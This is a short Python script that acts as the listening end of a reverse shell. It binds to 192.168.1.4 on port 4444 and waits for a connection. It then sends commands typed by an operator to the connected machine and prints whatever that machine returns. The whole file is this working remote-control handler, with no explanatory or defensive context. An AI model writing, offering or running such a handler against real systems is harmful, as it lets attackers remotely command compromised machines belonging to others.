import subprocess
import socket

HOST = "192.168.1.4"
PORT = 4444

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)

print(f" Listening on {HOST}:{PORT} ")
conn, addr = s.accept()
print(f" Connection from {addr[0]}:{addr[1]} ")

while True:
    command = input("Shell >")
    if command.lower() in ("exit", "quit"):
        conn.sendall(b"exit\n")
        break

    conn.sendall(command.encode() + b"\n")

    data = conn.recv(65535).decode(errors="ignore")
    print(data, end="")

conn.close()
s.close()
